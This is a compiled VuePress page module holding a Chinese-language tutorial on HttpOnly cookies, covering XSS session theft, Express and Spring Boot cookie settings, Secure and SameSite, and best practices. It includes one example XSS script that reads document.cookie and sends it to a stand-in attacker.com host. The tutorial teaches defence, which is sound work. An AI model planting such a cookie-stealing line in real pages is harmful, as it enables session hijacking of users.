import{_ as a}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as i,a as o,o as s}from"./app-B8OghdsB.js";const n={};function t(l,e){return s(),i("div",null,[...e[0]||(e[0]=[o(`<h1 id="httponly-cookie" tabindex="-1"><a class="header-anchor" href="#httponly-cookie"><span>HttpOnly Cookie</span></a></h1><hr><p>在 Web 开发中，我们常说「安全无小事」。但你是否想过，一个看似普通的 Cookie，可能成为黑客窃取用户身份的「钥匙」？</p><p>2002 年，微软在 IE6 中首次引入了一个不起眼的 Cookie 属性——<code>HttpOnly</code>。这个属性的诞生，彻底改变了客户端脚本与 Cookie 的交互规则，为防范跨站脚本攻击（XSS）筑起了一道关键防线。</p><h2 id="一、为什么需要-httponly-cookie" tabindex="-1"><a class="header-anchor" href="#一、为什么需要-httponly-cookie"><span>一、为什么需要 HttpOnly Cookie？</span></a></h2><p>要理解 HttpOnly 的价值，得先回到 Web 安全的经典威胁——<strong>跨站脚本攻击（XSS）​</strong>。</p><h3 id="场景还原-xss-如何窃取-cookie" tabindex="-1"><a class="header-anchor" href="#场景还原-xss-如何窃取-cookie"><span>场景还原：XSS 如何窃取 Cookie？</span></a></h3><p>假设某电商网站的用户登录后，服务器返回一个包含会话 ID 的 Cookie：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>Set-Cookie: sessionId=abc123; Path=/;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>此时，若页面存在 XSS 漏洞（例如用户评论区未过滤恶意脚本），攻击者可以注入一段 JavaScript：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>// 恶意脚本通过 document.cookie 窃取 Cookie</span></span>
<span class="line"><span>var cookie = document.cookie; </span></span>
<span class="line"><span>// 发送到攻击者服务器</span></span>
<span class="line"><span>new Image().src = &#39;https://attacker.com/?data=&#39; + encodeURIComponent(cookie);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这段代码会明文读取用户的 <code>sessionId</code>，并通过图片请求发送给攻击者。攻击者拿到会话 ID 后，就能冒充用户身份操作账户——这就是典型的「会话劫持」。</p><h3 id="传统-cookie-的缺陷-脚本可随意访问" tabindex="-1"><a class="header-anchor" href="#传统-cookie-的缺陷-脚本可随意访问"><span>传统 Cookie 的缺陷：脚本可随意访问</span></a></h3><p>普通 Cookie 的设计缺陷在于：​<strong>客户端脚本（如 JavaScript）可以通过 <code>document.cookie</code> 接口自由读写 Cookie</strong>。这原本是为了方便前端业务（例如记住用户偏好），但在 XSS 攻击面前，却成了致命漏洞。</p><h2 id="二、httponly-cookie-的核心机制" tabindex="-1"><a class="header-anchor" href="#二、httponly-cookie-的核心机制"><span>二、HttpOnly Cookie 的核心机制</span></a></h2><p>HttpOnly Cookie 的本质是<strong>通过协议层约束，禁止客户端脚本访问敏感 Cookie</strong>。它由服务器在响应头 <code>Set-Cookie</code> 中声明，浏览器会强制实施这一规则。</p><h3 id="_1-如何声明-httponly-cookie" tabindex="-1"><a class="header-anchor" href="#_1-如何声明-httponly-cookie"><span>1. 如何声明 HttpOnly Cookie？</span></a></h3><p>服务器只需在 <code>Set-Cookie</code> 头部添加 <code>HttpOnly</code> 标志即可。示例：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>Set-Cookie: sessionId=abc123; Path=/; HttpOnly; Secure; SameSite=Lax</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ul><li><code>HttpOnly</code>：声明该 Cookie 仅限 HTTP(S) 协议层面使用，禁止任何客户端脚本（包括 JavaScript）通过 <code>document.cookie</code> 访问。</li><li>其他常见标志（如 <code>Secure</code>、<code>SameSite</code>）：与 HttpOnly 配合使用，进一步增强安全性（后文详述）。</li></ul><h3 id="_2-浏览器如何处理-httponly-cookie" tabindex="-1"><a class="header-anchor" href="#_2-浏览器如何处理-httponly-cookie"><span>2. 浏览器如何处理 HttpOnly Cookie？</span></a></h3><p>当浏览器收到带有 <code>HttpOnly</code> 标志的 Cookie 时，会将其存储在一个<strong>受保护的隔离区域</strong>中。前端代码通过 <code>document.cookie</code> 只能访问非 HttpOnly 的 Cookie，而 HttpOnly Cookie 对脚本「完全不可见」。</p><p>举个例子：</p><ul><li>普通 Cookie：<code>userToken=xyz</code>（可通过 <code>document.cookie</code> 读取）。</li><li>HttpOnly Cookie：<code>sessionId=abc123; HttpOnly</code>（<code>document.cookie</code> 返回空字符串）。</li></ul><h3 id="_3-防御-xss-的底层逻辑" tabindex="-1"><a class="header-anchor" href="#_3-防御-xss-的底层逻辑"><span>3. 防御 XSS 的底层逻辑</span></a></h3><p>即使页面被注入恶意脚本，攻击者也无法通过 <code>document.cookie</code> 窃取 HttpOnly Cookie。这意味着，XSS 攻击最多只能获取页面中明文存储的其他数据（如用户输入的内容），但无法拿到关键的会话凭证，会话劫持的风险被大幅降低。</p><h2 id="三、实战-如何正确设置-httponly-cookie" tabindex="-1"><a class="header-anchor" href="#三、实战-如何正确设置-httponly-cookie"><span>三、实战：如何正确设置 HttpOnly Cookie？</span></a></h2><h3 id="_1-服务端设置示例" tabindex="-1"><a class="header-anchor" href="#_1-服务端设置示例"><span>1. 服务端设置示例</span></a></h3><p>不同后端语言的实现方式类似，核心是在响应头中添加 <code>HttpOnly</code> 标志。</p><h4 id="node-js-express" tabindex="-1"><a class="header-anchor" href="#node-js-express"><span>Node.js（Express）：</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>res.cookie(&#39;sessionId&#39;, &#39;abc123&#39;, { </span></span>
<span class="line"><span>  httpOnly: true,  // 启用 HttpOnly</span></span>
<span class="line"><span>  secure: process.env.NODE_ENV === &#39;production&#39;,  // 生产环境强制 HTTPS</span></span>
<span class="line"><span>  sameSite: &#39;lax&#39;  // 防御 CSRF</span></span>
<span class="line"><span>});</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="java-spring-boot" tabindex="-1"><a class="header-anchor" href="#java-spring-boot"><span>Java（Spring Boot）：</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>ResponseCookie cookie = ResponseCookie.from(&quot;sessionId&quot;, &quot;abc123&quot;)</span></span>
<span class="line"><span>    .httpOnly(true)  // 启用 HttpOnly</span></span>
<span class="line"><span>    .secure(true)    // 生产环境强制 HTTPS</span></span>
<span class="line"><span>    .sameSite(&quot;Lax&quot;) // 防御 CSRF</span></span>
<span class="line"><span>    .path(&quot;/&quot;)       // 生效路径</span></span>
<span class="line"><span>    .build();</span></span>
<span class="line"><span>response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_2-注意事项" tabindex="-1"><a class="header-anchor" href="#_2-注意事项"><span>2. 注意事项</span></a></h3><ul><li>​<strong>必须配合 HTTPS</strong>​：<code>HttpOnly</code> 不限制 Cookie 的传输方式，若网站使用 HTTP，Cookie 可能在传输中被中间人窃取。因此，需同时启用 <code>Secure</code> 标志（仅 HTTPS 传输）。</li><li>​<strong>不影响服务端操作</strong>​：服务端仍可通过请求头 <code>Cookie</code> 正常读取 HttpOnly Cookie（例如验证会话），这一特性对业务逻辑无感知。</li></ul><h2 id="四、httponly-与其他安全属性的协同" tabindex="-1"><a class="header-anchor" href="#四、httponly-与其他安全属性的协同"><span>四、HttpOnly 与其他安全属性的协同</span></a></h2><p>HttpOnly 并非「万能药」，需与其他 Cookie 属性配合，才能构建完整的安全体系。</p><h3 id="_1-secure-传输层加密" tabindex="-1"><a class="header-anchor" href="#_1-secure-传输层加密"><span>1. Secure：传输层加密</span></a></h3><p><code>Secure</code> 标志强制 Cookie 仅在 HTTPS 连接下传输，防止中间人在网络层窃取 Cookie。它与 HttpOnly 是「互补关系」：HttpOnly 防止脚本窃取，Secure 防止传输窃取。</p><h3 id="_2-samesite-跨站请求防护" tabindex="-1"><a class="header-anchor" href="#_2-samesite-跨站请求防护"><span>2. SameSite：跨站请求防护</span></a></h3><p><code>SameSite</code> 控制 Cookie 是否随跨站请求发送，可防范 CSRF（跨站请求伪造）攻击。例如：</p><ul><li><code>SameSite=Strict</code>：仅在同站请求中发送 Cookie（最严格，但可能影响用户体验）。</li><li><code>SameSite=Lax</code>（默认推荐）：允许部分安全的跨站请求（如 GET 导航），阻止危险操作（如 POST 提交）。</li></ul><h3 id="_3-组合策略示例" tabindex="-1"><a class="header-anchor" href="#_3-组合策略示例"><span>3. 组合策略示例</span></a></h3><p>一个安全的 Cookie 配置应包含：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>Set-Cookie: sessionId=abc123; Path=/; HttpOnly; Secure; SameSite=Lax</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="五、局限性与最佳实践" tabindex="-1"><a class="header-anchor" href="#五、局限性与最佳实践"><span>五、局限性与最佳实践</span></a></h2><h3 id="_1-httponly-的边界" tabindex="-1"><a class="header-anchor" href="#_1-httponly-的边界"><span>1. HttpOnly 的边界</span></a></h3><ul><li>​<strong>无法防御所有攻击</strong>​：HttpOnly 能阻止 XSS 窃取 Cookie，但无法防御 XSS 执行的其他恶意操作（如修改页面内容、钓鱼攻击）。</li><li>​<strong>不防 CSRF</strong>​：CSRF 攻击的本质是「伪造用户请求」，即使 Cookie 是 HttpOnly，只要请求携带 Cookie（同站），仍可能被利用（需配合 SameSite 或 CSRF Token 防御）。</li></ul><h3 id="_2-最佳实践" tabindex="-1"><a class="header-anchor" href="#_2-最佳实践"><span>2. 最佳实践</span></a></h3><ul><li>​<strong>敏感 Cookie 强制 HttpOnly</strong>​：所有与会话、身份相关的 Cookie（如 <code>sessionId</code>、<code>token</code>）必须声明 <code>HttpOnly</code>。</li><li>​<strong>最小化 Cookie 作用域</strong>​：通过 <code>Path</code> 和 <code>Domain</code> 限制 Cookie 的生效范围（例如仅限 <code>/api</code> 路径），减少泄露风险。</li><li>​<strong>定期轮换会话 ID</strong>​：即使 Cookie 被窃取，短时效的会话 ID 能降低攻击窗口（可结合 <code>Max-Age</code> 或 <code>Expires</code>控制过期时间）。</li></ul><h2 id="总结" tabindex="-1"><a class="header-anchor" href="#总结"><span>总结</span></a></h2><p>HttpOnly Cookie 是 Web 安全史上的一个关键创新，它通过协议层的约束，将敏感 Cookie 与客户端脚本隔离，为防范 XSS 攻击提供了「最后一道防线」。</p><p>但安全没有「银弹」——HttpOnly 需与 HTTPS、SameSite、CSRF Token 等机制配合，才能构建真正的安全体系。作为开发者，我们应当将其作为默认实践，在每一个需要身份验证的 Cookie 上打上 <code>HttpOnly</code> 的标记，让用户的会话凭证更安全一点。</p><p>毕竟，安全的本质，是用最小的代价，防范最大的风险。</p>`,54)])])}const c=a(n,[["render",t]]),r=JSON.parse('{"path":"/guide/computer/HttpOnly-Cookie.html","title":"HttpOnly Cookie","lang":"zh-CN","frontmatter":{"description":"HttpOnly Cookie 在 Web 开发中，我们常说「安全无小事」。但你是否想过，一个看似普通的 Cookie，可能成为黑客窃取用户身份的「钥匙」？ 2002 年，微软在 IE6 中首次引入了一个不起眼的 Cookie 属性——HttpOnly。这个属性的诞生，彻底改变了客户端脚本与 Cookie 的交互规则，为防范跨站脚本攻击（XSS）筑起了...","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"HttpOnly Cookie\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-10-20T07:01:52.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"yjieyan\\",\\"url\\":\\"https://yjieyan.github.io/knowledge\\"}]}"],["meta",{"property":"og:url","content":"https://vuepress-theme-hope-docs-demo.netlify.app/knowledge/guide/computer/HttpOnly-Cookie.html"}],["meta",{"property":"og:site_name","content":"学习与分享"}],["meta",{"property":"og:title","content":"HttpOnly Cookie"}],["meta",{"property":"og:description","content":"HttpOnly Cookie 在 Web 开发中，我们常说「安全无小事」。但你是否想过，一个看似普通的 Cookie，可能成为黑客窃取用户身份的「钥匙」？ 2002 年，微软在 IE6 中首次引入了一个不起眼的 Cookie 属性——HttpOnly。这个属性的诞生，彻底改变了客户端脚本与 Cookie 的交互规则，为防范跨站脚本攻击（XSS）筑起了..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-10-20T07:01:52.000Z"}],["meta",{"property":"article:modified_time","content":"2025-10-20T07:01:52.000Z"}]]},"git":{"createdTime":1760943712000,"updatedTime":1760943712000,"contributors":[{"name":"yjy","username":"yjy","email":"2192242196@qq.com","commits":1,"url":"https://github.com/yjy"}]},"readingTime":{"minutes":5.01,"words":1502},"filePathRelative":"guide/computer/HttpOnly-Cookie.md","autoDesc":true}');export{c as comp,r as data};
